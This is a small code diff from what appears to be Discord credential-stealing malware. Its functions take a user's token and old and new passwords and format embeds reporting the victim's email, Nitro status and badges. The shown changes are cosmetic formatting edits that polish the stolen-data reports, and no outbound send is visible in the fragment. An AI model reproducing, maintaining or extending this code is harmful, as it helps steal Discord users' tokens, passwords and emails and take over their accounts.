@@ -565,13 +565,13 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return '\`No Nitro\`';
     case 1:
       return '<:Nitro:980199520568754176>';
     case 2:
       return '<:Nitro:980199520568754176> <:nitrobooster_LL:901537814448050206>';
     default:
-      return 'No Nitro';
+      return '\`No Nitro\`';
   }
 };
 
@@ -609,10 +609,10 @@ const getBadges = (flags) => {
       badges += '<:hypesquad:912060331088547840>';
       break;
     case 0:
-      badges = 'None';
+      badges = '\`None\`';
       break;
     default:
-      badges = 'None';
+      badges = '\`None\`';
       break;
   }
   return badges;
@@ -784,8 +784,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: 'Email Changed',
-              value: `New Email: **${email}**`,
+              name: 'New Email',
+              value: `\`${email}\``,
               inline: false,
             },
             {
